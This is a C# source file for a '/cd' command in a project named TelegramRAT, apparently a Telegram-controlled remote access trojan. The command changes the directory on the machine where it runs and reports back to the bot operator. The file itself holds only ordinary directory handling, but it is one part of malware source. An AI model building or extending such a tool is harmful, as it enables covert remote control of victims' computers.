using TelegramRAT.Services;

namespace TelegramRAT.Commands.File;

public class CdCommand(IBotNotificationService notificationService, IFileSystemService fileSystemService) : AbstractBotCommand
{
    public override string Command => "cd";
    public override string Description => "Change current directory.";
    public override string Example => "/cd C:\\Users";

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        try
        {
            var pathInput = model.Args.Length > 0 ? string.Join(' ', model.Args) : (model.RawArgs ?? string.Empty);
            var targetDirectoryInput = fileSystemService.SanitizePath(pathInput);

            if (string.IsNullOrWhiteSpace(targetDirectoryInput))
            {
                if (model.Message != null)
                {
                    await notificationService.SendErrorAsync(model.Message, new DirectoryNotFoundException("The specified directory does not exist."));
                }
                return;
            }

            var targetDirectory = fileSystemService.GetFullPath(targetDirectoryInput);

            if (fileSystemService.DirectoryExists(targetDirectory))
            {
                fileSystemService.SetCurrentDirectory(targetDirectory);
                if (model.Message != null)
                {
                    await notificationService.SendSuccessAsync(model.Message, $"Directory changed to: <code>{fileSystemService.GetCurrentDirectory()}</code>");
                }
            }
            else
            {
                if (model.Message != null)
                {
                    await notificationService.SendErrorAsync(model.Message, new DirectoryNotFoundException("The specified directory does not exist."));
                }
            }
        }
        catch (Exception ex)
        {
            if (model.Message != null)
            {
                await notificationService.ReportExceptionAsync(model.Message, ex);
            }
        }
    }
}
